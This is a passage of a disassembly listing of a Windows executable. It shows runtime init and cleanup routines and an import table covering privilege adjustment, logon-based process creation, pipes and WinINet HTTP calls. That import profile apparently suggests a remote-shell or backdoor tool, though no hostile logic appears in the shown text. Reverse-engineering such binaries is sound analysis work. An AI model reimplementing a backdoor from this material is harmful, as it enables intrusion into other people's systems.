                push    offset sub_41F2A0
                call    sub_40E955
                pop     ecx
                retn
sub_41F210      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F230      proc near               ; DATA XREF: .rdata:004201F4↓o
                push    4
                call    sub_40F94F
                xor     ecx, ecx
                add     esp, 4
                cmp     eax, ecx
                jz      short loc_41F248
                mov     dword ptr [eax], offset dword_42C8C8
                jmp     short loc_41F24A
; ---------------------------------------------------------------------------

loc_41F248:                             ; CODE XREF: sub_41F230+E↑j
                xor     eax, eax

loc_41F24A:                             ; CODE XREF: sub_41F230+16↑j
                push    offset sub_41F300
                mov     dword_42C8C8, eax
                mov     dword_42C8D8, ecx
                mov     dword_42C8DC, ecx
                mov     dword_42C8E0, ecx
                mov     dword_42C8E4, ecx
                call    sub_40E955
                pop     ecx
                retn
sub_41F230      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F280      proc near               ; DATA XREF: .rdata:004201F8↓o
                push    offset CriticalSection ; lpCriticalSection
                call    ds:InitializeCriticalSection
                push    offset sub_41F320
                call    sub_40E955
                pop     ecx
                retn
sub_41F280      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F2A0      proc near               ; DATA XREF: sub_41F210+5↑o

var_4           = dword ptr -4

                push    ecx
                mov     eax, dword_42C8BC
                test    eax, eax
                jz      short loc_41F2C8
                mov     ecx, [esp+4+var_4]
                mov     edx, dword_42C8C0
                push    ecx
                push    edx
                call    sub_40B180
                mov     eax, dword_42C8BC
                push    eax
                call    sub_40F15B
                add     esp, 0Ch

loc_41F2C8:                             ; CODE XREF: sub_41F2A0+8↑j
                mov     ecx, dword_42C8B0
                push    ecx
                mov     dword_42C8BC, 0
                mov     dword_42C8C0, 0
                mov     dword_42C8C4, 0
                call    sub_40F15B
                add     esp, 8
                retn
sub_41F2A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F300      proc near               ; DATA XREF: sub_41F230:loc_41F24A↑o
                call    sub_408FF0
                mov     eax, dword_42C8C8
                push    eax
                call    sub_40F15B
                pop     ecx
                retn
sub_41F300      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F320      proc near               ; DATA XREF: sub_41F280+B↑o
                push    offset CriticalSection ; lpCriticalSection
                call    ds:DeleteCriticalSection
                retn
sub_41F320      endp

; ---------------------------------------------------------------------------

loc_41F32C:                             ; DATA XREF: sub_40F94F+42↑o
                mov     dword_42AAC4, offset off_420260
                mov     ecx, offset dword_42AAC4
                jmp     sub_40E716
; ---------------------------------------------------------------------------
                align 100h
                dd 300h dup(?)
_text           ends

; Section 2. (virtual address 00020000)
; Virtual size                  : 00004AAC (  19116.)
; Section size in file          : 00004C00 (  19456.)
; Offset to raw data for section: 0001E800
; Flags 40000040: Data Readable
; Alignment     : default
;
; Imports from ADVAPI32.dll
;
; ===========================================================================

; Segment type: Externs
; _idata
; BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid)
                extrn LookupPrivilegeValueA:dword
                                        ; CODE XREF: sub_40DAD0+32↑p
                                        ; sub_40DD30+B0↑p ...
; BOOL __stdcall LookupAccountSidA(LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse)
                extrn LookupAccountSidA:dword
                                        ; CODE XREF: sub_40DB70+F6↑p
                                        ; DATA XREF: sub_40DB70+F6↑r
; BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength)
                extrn GetTokenInformation:dword
                                        ; CODE XREF: sub_40DB70+92↑p
                                        ; sub_40DB70+BF↑p
                                        ; DATA XREF: ...
; BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
                extrn OpenProcessToken:dword
                                        ; CODE XREF: sub_40DAD0+17↑p
                                        ; sub_40DB70+6A↑p ...
; BOOL __stdcall CreateProcessWithLogonW(LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
                extrn CreateProcessWithLogonW:dword
                                        ; CODE XREF: sub_405F00+28F↑p
                                        ; DATA XREF: sub_405F00+28F↑r
; BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength)
                extrn AdjustTokenPrivileges:dword
                                        ; CODE XREF: sub_40DAD0+7B↑p
                                        ; sub_40DD30+E8↑p ...

;
; Imports from KERNEL32.dll
;
; HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName)
                extrn CreateEventA:dword
                                        ; CODE XREF: sub_401AE0+B5↑p
                                        ; sub_401AE0+10E↑p ...
; BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
                extrn CreateProcessA:dword
                                        ; CODE XREF: sub_4062E0+B6↑p
                                        ; sub_4067C0+15B↑p ...
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode)
                extrn TerminateProcess:dword
                                        ; CODE XREF: sub_407110+360↑p
                                        ; sub_407850+23↑p ...
; BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
                extrn ReadFile:dword    ; CODE XREF: sub_403630+100↑p
                                        ; sub_403980+10B↑p ...
; UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
                extrn GetSystemDirectoryA:dword
                                        ; CODE XREF: sub_4067C0+65↑p
                                        ; DATA XREF: sub_4067C0+65↑r
; int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar)
                extrn MultiByteToWideChar:dword
                                        ; CODE XREF: sub_405F00+1A5↑p
                                        ; sub_405F00+1BC↑p ...
; BOOL __stdcall DisconnectNamedPipe(HANDLE hNamedPipe)
                extrn DisconnectNamedPipe:dword
                                        ; CODE XREF: sub_406C90+51↑p
                                        ; sub_407620+1DF↑p ...
; BOOL __stdcall SetCurrentDirectoryA(LPCSTR lpPathName)
                extrn SetCurrentDirectoryA:dword
                                        ; CODE XREF: sub_407110+9A↑p
                                        ; sub_407110+170↑p ...
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo)
                extrn GetStartupInfoA:dword
                                        ; CODE XREF: sub_4067C0+DD↑p
                                        ; sub_407110+1FF↑p ...
; DWORD __stdcall GetLastError()
                extrn GetLastError:dword
                                        ; CODE XREF: sub_401E10+70D↑p
                                        ; sub_401E10:loc_4025CB↑p ...
; HANDLE __stdcall CreateNamedPipeA(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes)
                extrn CreateNamedPipeA:dword
                                        ; CODE XREF: sub_406C90+94↑p
                                        ; DATA XREF: sub_406C90+94↑r
; BOOL __stdcall CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize)
                extrn CreatePipe:dword  ; CODE XREF: sub_4067C0+C4↑p
                                        ; sub_4067C0+D6↑p ...
; DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
                extrn GetModuleFileNameA:dword
                                        ; CODE XREF: sub_407940+AF↑p
                                        ; sub_41740A+A3↑p ...
; DWORD __stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
                extrn GetCurrentDirectoryA:dword
                                        ; CODE XREF: sub_406A40+64↑p
                                        ; sub_407110+3B2↑p
                                        ; DATA XREF: ...
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)
                extrn GetVersionExA:dword
                                        ; CODE XREF: sub_4041F0+D7↑p
                                        ; DATA XREF: sub_4041F0+D7↑r
; void __stdcall Sleep(DWORD dwMilliseconds)
                extrn Sleep:dword       ; CODE XREF: sub_401E10+73B↑p
                                        ; sub_401E10+78A↑p ...
; void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
                extrn InitializeCriticalSection:dword
                                        ; CODE XREF: sub_41F280+5↑p
                                        ; DATA XREF: sub_41F280+5↑r
; void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
                extrn LeaveCriticalSection:dword
                                        ; CODE XREF: sub_4027B0+17A↑p
                                        ; sub_403630+16D↑p ...
; void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
                extrn EnterCriticalSection:dword
                                        ; CODE XREF: sub_4027B0+79↑p
                                        ; sub_403630+107↑p ...
; void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
                extrn DeleteCriticalSection:dword
                                        ; CODE XREF: sub_4167E2+1D↑p
                                        ; sub_4167E2+47↑p ...
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
                extrn CreateFileA:dword ; CODE XREF: sub_419E86+22F↑p
                                        ; sub_419E86+268↑p ...
; HANDLE __stdcall GetCurrentProcess()
                extrn GetCurrentProcess:dword
                                        ; CODE XREF: sub_40DAD0+10↑p
                                        ; sub_40DD30+91↑p ...
; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
                extrn OpenProcess:dword ; CODE XREF: sub_40DB70+50↑p
                                        ; sub_40DCD0+19↑p ...
; int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar)
                extrn WideCharToMultiByte:dword
                                        ; CODE XREF: sub_40D8D0+D1↑p
                                        ; sub_4148B5+237↑p ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
                extrn GetProcAddress:dword
                                        ; CODE XREF: sub_405710+71↑p
                                        ; sub_405850+68↑p ...
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
                extrn GetModuleHandleA:dword
                                        ; CODE XREF: sub_405710+6A↑p
                                        ; sub_405850+61↑p ...
; BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwExitCode)
                extrn TerminateThread:dword
                                        ; CODE XREF: sub_401E10+8C3↑p
                                        ; sub_401E10+8F1↑p ...
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
                extrn WriteFile:dword   ; CODE XREF: sub_406C90+267↑p
                                        ; sub_407040+6D↑p ...
; BOOL __stdcall ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped)
                extrn ConnectNamedPipe:dword
                                        ; CODE XREF: sub_406C90+171↑p
                                        ; DATA XREF: sub_406C90+171↑r
; BOOL __stdcall SetEvent(HANDLE hEvent)
                extrn SetEvent:dword    ; CODE XREF: sub_4065E0+87↑p
                                        ; sub_407040+91↑p ...
; DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
                extrn WaitForSingleObject:dword
                                        ; CODE XREF: sub_401AE0+157↑p
                                        ; sub_401AE0:loc_401D95↑p ...
; BOOL __stdcall CloseHandle(HANDLE hObject)
                extrn CloseHandle:dword ; CODE XREF: sub_401AE0+15F↑p
                                        ; sub_401AE0+168↑p ...
; BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage)
                extrn PeekNamedPipe:dword
                                        ; CODE XREF: sub_403630+9B↑p
                                        ; sub_403980+BE↑p ...
; HANDLE __stdcall GetProcessHeap()
                extrn GetProcessHeap:dword
                                        ; CODE XREF: sub_41CC6C+69↑p
                                        ; sub_41CC6C+EC↑p
                                        ; DATA XREF: ...
; BOOL __stdcall SetEndOfFile(HANDLE hFile)
                extrn SetEndOfFile:dword
                                        ; CODE XREF: sub_41CC6C+14E↑p
                                        ; DATA XREF: sub_41CC6C+14E↑r
; BOOL __stdcall FlushFileBuffers(HANDLE hFile)
                extrn FlushFileBuffers:dword
                                        ; CODE XREF: sub_41ADBB+8C↑p
                                        ; DATA XREF: sub_41ADBB+8C↑r
; BOOL __stdcall WriteConsoleW(HANDLE hConsoleOutput, const void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved)
                extrn WriteConsoleW:dword
                                        ; CODE XREF: sub_41AB93+48↑p
                                        ; DATA XREF: sub_41AB93+48↑r
; UINT __stdcall GetConsoleOutputCP()
                extrn GetConsoleOutputCP:dword
                                        ; CODE XREF: sub_41AB93+7B↑p
                                        ; DATA XREF: sub_41AB93+7B↑r
; BOOL __stdcall WriteConsoleA(HANDLE hConsoleOutput, const void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved)
                extrn WriteConsoleA:dword
                                        ; CODE XREF: sub_41AB93+9E↑p
                                        ; DATA XREF: sub_41AB93+9E↑r
; BOOL __stdcall InitializeCriticalSectionAndSpinCount(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount)
                extrn InitializeCriticalSectionAndSpinCount:dword
                                        ; CODE XREF: sub_419CA1+16↑p
                                        ; DATA XREF: sub_419CA1+16↑r
; HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName)
                extrn LoadLibraryA:dword
                                        ; CODE XREF: sub_41C65F+28↑p
                                        ; DATA XREF: sub_41C65F+28↑r
; int __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)
                extrn GetLocaleInfoA:dword
                                        ; CODE XREF: sub_41CA3A+24↑p
                                        ; DATA XREF: sub_41CA3A+24↑r
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int cchSrc, LPWORD lpCharType)
                extrn GetStringTypeW:dword
                                        ; CODE XREF: sub_41922F+2F↑p
                                        ; sub_41922F+11E↑p ...
; BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType)
                extrn GetStringTypeA:dword
                                        ; CODE XREF: sub_41922F+193↑p
                                        ; DATA XREF: sub_41922F+193↑r
; int __stdcall LCMapStringW(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest)
                extrn LCMapStringW:dword
                                        ; CODE XREF: sub_418E45+32↑p
                                        ; sub_418E45+158↑p ...
; int __stdcall LCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest)
                extrn LCMapStringA:dword
                                        ; CODE XREF: sub_418E45+2A9↑p
                                        ; sub_418E45+31B↑p ...
; void __stdcall __noreturn ExitThread(DWORD dwExitCode)
                extrn ExitThread:dword  ; CODE XREF: sub_40E96C+36↑p
                                        ; StartAddress+34↑p
                                        ; DATA XREF: ...
; DWORD __stdcall GetCurrentThreadId()
                extrn GetCurrentThreadId:dword
                                        ; CODE XREF: StartAddress:loc_40EA24↑p
                                        ; sub_41238C+56↑p ...
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
                extrn CreateThread:dword
                                        ; CODE XREF: sub_40EA6D+81↑p
                                        ; DATA XREF: sub_40EA6D+81↑r
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
                extrn UnhandledExceptionFilter:dword
                                        ; CODE XREF: sub_40EB2C+F3↑p
                                        ; sub_4107C6+DB↑p ...
; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
                extrn SetUnhandledExceptionFilter:dword
                                        ; CODE XREF: sub_40EB2C+E6↑p
                                        ; sub_4107C6+D0↑p ...
; BOOL __stdcall IsDebuggerPresent()
                extrn IsDebuggerPresent:dword
                                        ; CODE XREF: sub_40EB2C+DC↑p
                                        ; sub_4107C6+BB↑p
                                        ; DATA XREF: ...
; void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime)
                extrn GetSystemTimeAsFileTime:dword
                                        ; CODE XREF: sub_40F8E3+B↑p
                                        ; sub_417AF4+37↑p
                                        ; DATA XREF: ...
; BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem)
                extrn HeapFree:dword    ; CODE XREF: sub_40FD55+68↑p
                                        ; sub_416976+2B6↑p ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
                extrn HeapAlloc:dword   ; CODE XREF: sub_40FE32+77↑p
                                        ; sub_40FEFC+DD↑p ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
                extrn HeapReAlloc:dword ; CODE XREF: sub_40FEFC+134↑p
                                        ; sub_40FEFC+1B5↑p ...
; LPSTR __stdcall GetCommandLineA()
                extrn GetCommandLineA:dword
                                        ; CODE XREF: start:loc_4101D5↑p
                                        ; DATA XREF: start:loc_4101D5↑r
; void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)
                extrn RaiseException:dword
                                        ; CODE XREF: sub_41032B+42↑p
                                        ; DATA XREF: sub_41032B+42↑r
; void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)
                extrn __imp_RtlUnwind:dword
                                        ; DATA XREF: RtlUnwind↑r
; BOOL __stdcall GetCPInfo(UINT CodePage, LPCPINFO lpCPInfo)
                extrn GetCPInfo:dword   ; CODE XREF: sub_41178C+21↑p
                                        ; sub_411A3F+86↑p ...
; LONG __stdcall InterlockedIncrement(volatile LONG *lpAddend)
                extrn InterlockedIncrement:dword
                                        ; CODE XREF: sub_41191F+84↑p
                                        ; sub_411C24+9B↑p ...
; LONG __stdcall InterlockedDecrement(volatile LONG *lpAddend)
                extrn InterlockedDecrement:dword
                                        ; CODE XREF: sub_41191F+59↑p
                                        ; sub_411C24+76↑p ...
; UINT __stdcall GetACP()
                extrn GetACP:dword      ; CODE XREF: sub_4119C3+4C↑p
                                        ; DATA XREF: sub_4119C3+4C↑r
; UINT __stdcall GetOEMCP()
                extrn GetOEMCP:dword    ; CODE XREF: sub_4119C3+29↑p
                                        ; DATA XREF: sub_4119C3+29↑r
; BOOL __stdcall IsValidCodePage(UINT CodePage)
                extrn IsValidCodePage:dword
                                        ; CODE XREF: sub_411A3F+73↑p
                                        ; DATA XREF: sub_411A3F+73↑r
; HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName)
                extrn GetModuleHandleW:dword
                                        ; CODE XREF: sub_412101+3F↑p
                                        ; sub_41217C+3F↑p ...
; LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)
                extrn TlsGetValue:dword ; CODE XREF: sub_412101+12↑p
                                        ; sub_412101+29↑p ...
; DWORD __stdcall TlsAlloc()
                extrn TlsAlloc:dword    ; CODE XREF: sub_4121EE↑p
                                        ; sub_4125BC:loc_412664↑p
                                        ; DATA XREF: ...
; BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue)
                extrn TlsSetValue:dword ; CODE XREF: sub_412217+2A↑p
                                        ; sub_41254E+66↑p ...
; BOOL __stdcall TlsFree(DWORD dwTlsIndex)
                extrn TlsFree:dword     ; CODE XREF: sub_412268+2B↑p
                                        ; DATA XREF: sub_412268+2B↑r ...
; void __stdcall SetLastError(DWORD dwErrCode)
                extrn SetLastError:dword
                                        ; CODE XREF: sub_41238C+6E↑p
                                        ; sub_419CA1+46↑p
                                        ; DATA XREF: ...
; SIZE_T __stdcall HeapSize(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem)
                extrn HeapSize:dword    ; CODE XREF: sub_412C92+82↑p
                                        ; DATA XREF: sub_412C92+82↑r
; void __stdcall __noreturn ExitProcess(UINT uExitCode)
                extrn ExitProcess:dword ; CODE XREF: sub_412DB9+11↑p
                                        ; DATA XREF: sub_412DB9+11↑r
; UINT __stdcall GetConsoleCP()
                extrn GetConsoleCP:dword
                                        ; CODE XREF: sub_4148B5:loc_4149FC↑p
                                        ; DATA XREF: sub_4148B5:loc_4149FC↑r
; BOOL __stdcall GetConsoleMode(HANDLE hConsoleHandle, LPDWORD lpMode)
                extrn GetConsoleMode:dword
                                        ; CODE XREF: sub_4148B5+127↑p
                                        ; DATA XREF: sub_4148B5+127↑r
; UINT __stdcall SetHandleCount(UINT uNumber)
                extrn SetHandleCount:dword
                                        ; CODE XREF: sub_415257+233↑p
                                        ; DATA XREF: sub_415257+233↑r
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
                extrn GetStdHandle:dword
                                        ; CODE XREF: sub_415257+1C9↑p
                                        ; sub_41740A+176↑p
                                        ; DATA XREF: ...
; DWORD __stdcall GetFileType(HANDLE hFile)
                extrn GetFileType:dword ; CODE XREF: sub_415257+13F↑p
                                        ; sub_415257+1DB↑p ...
; DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
                extrn SetFilePointer:dword
                                        ; CODE XREF: sub_4154AB+2F↑p
                                        ; sub_41892C+42↑p
                                        ; DATA XREF: ...
; BOOL __stdcall SetStdHandle(DWORD nStdHandle, HANDLE hHandle)
                extrn SetStdHandle:dword
                                        ; CODE XREF: sub_41615F:loc_4161B6↑p
                                        ; sub_4161E0:loc_41623C↑p
                                        ; DATA XREF: ...
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
                extrn HeapCreate:dword  ; CODE XREF: sub_416767+15↑p
                                        ; DATA XREF: sub_416767+15↑r
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
                extrn VirtualFree:dword ; CODE XREF: sub_416976+249↑p
                                        ; sub_416976+2A4↑p
                                        ; DATA XREF: ...
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
                extrn VirtualAlloc:dword
                                        ; CODE XREF: sub_416C8C+77↑p
                                        ; sub_416D3C+54↑p
                                        ; DATA XREF: ...
; BOOL __stdcall FreeEnvironmentStringsA(LPCH)
                extrn FreeEnvironmentStringsA:dword
                                        ; CODE XREF: sub_417971+111↑p
                                        ; sub_417971+12A↑p
                                        ; DATA XREF: ...
; LPCH __stdcall GetEnvironmentStrings()
                extrn GetEnvironmentStrings:dword
                                        ; CODE XREF: sub_417971:loc_417A50↑p
                                        ; DATA XREF: sub_417971:loc_417A50↑r
; BOOL __stdcall FreeEnvironmentStringsW(LPWCH)
                extrn FreeEnvironmentStringsW:dword
                                        ; CODE XREF: sub_417971+CC↑p
                                        ; DATA XREF: sub_417971+CC↑r
; LPWCH __stdcall GetEnvironmentStringsW()
                extrn GetEnvironmentStringsW:dword
                                        ; CODE XREF: sub_417971+1E↑p
                                        ; sub_417971+59↑p
                                        ; DATA XREF: ...
; BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount)
                extrn QueryPerformanceCounter:dword
                                        ; CODE XREF: sub_417AF4+5F↑p
                                        ; DATA XREF: sub_417AF4+5F↑r
; DWORD __stdcall GetTickCount()
                extrn GetTickCount:dword
                                        ; CODE XREF: sub_417AF4+53↑p
                                        ; DATA XREF: sub_417AF4+53↑r
; DWORD __stdcall GetCurrentProcessId()
                extrn GetCurrentProcessId:dword
                                        ; CODE XREF: sub_417AF4+43↑p
                                        ; DATA XREF: sub_417AF4+43↑r

;
; Imports from WININET.dll
;
; BOOL __stdcall InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten)
                extrn InternetWriteFile:dword
                                        ; CODE XREF: .text:0040344D↑p
                                        ; DATA XREF: .text:0040344D↑r ...
; BOOL __stdcall DeleteUrlCacheEntry(LPCSTR lpszUrlName)
                extrn DeleteUrlCacheEntry:dword
                                        ; CODE XREF: sub_403800+3D↑p
                                        ; DATA XREF: sub_403800+3D↑r
; BOOL __stdcall HttpSendRequestExA(HINTERNET hRequest, LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
                extrn HttpSendRequestExA:dword
                                        ; CODE XREF: sub_40E120+51↑p
                                        ; DATA XREF: sub_40E120+51↑r
; BOOL __stdcall HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)
                extrn HttpQueryInfoA:dword
                                        ; CODE XREF: sub_401E10+50C↑p
                                        ; sub_401E10+54A↑p ...
; HINTERNET __stdcall InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
                extrn InternetConnectA:dword
                                        ; CODE XREF: sub_401E10:loc_401EAA↑p
                                        ; DATA XREF: sub_401E10:loc_401EAA↑r
; BOOL __stdcall InternetQueryDataAvailable(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext)
                extrn InternetQueryDataAvailable:dword
                                        ; CODE XREF: sub_401E10+583↑p
                                        ; .text:00403562↑p ...
; BOOL __stdcall InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
                extrn InternetReadFile:dword
                                        ; CODE XREF: .text:0040357B↑p
                                        ; sub_404940+260↑p ...
; BOOL __stdcall InternetSetOptionA(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength)
                extrn InternetSetOptionA:dword
                                        ; CODE XREF: sub_401E10+187↑p
                                        ; sub_401E10+197↑p ...
; BOOL __stdcall InternetQueryOptionA(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength)
                extrn InternetQueryOptionA:dword
                                        ; CODE XREF: sub_401E10+167↑p
                                        ; sub_40DFC0+7B↑p
                                        ; DATA XREF: ...
; BOOL __stdcall InternetCloseHandle(HINTERNET hInternet)
                extrn InternetCloseHandle:dword
                                        ; CODE XREF: sub_401E10+B1↑p
                                        ; sub_401E10+674↑p ...
; HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
                extrn InternetOpenA:dword
                                        ; CODE XREF: sub_40DF40+39↑p
                                        ; DATA XREF: sub_40DF40+39↑r
; BOOL __stdcall HttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
                extrn HttpSendRequestA:dword
                                        ; CODE XREF: sub_401E10+4CF↑p
                                        ; sub_402A00+4A6↑p ...
; BOOL __stdcall HttpAddRequestHeadersA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers)
                extrn HttpAddRequestHeadersA:dword
                                        ; CODE XREF: sub_401E10+2BA↑p
                                        ; sub_401E10+308↑p ...
; BOOL __stdcall HttpEndRequestA(HINTERNET hRequest, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
                extrn HttpEndRequestA:dword
                                        ; CODE XREF: .text:00403494↑p
                                        ; DATA XREF: .text:00403494↑r
; HINTERNET __stdcall HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
                extrn HttpOpenRequestA:dword
                                        ; CODE XREF: sub_401E10+13B↑p
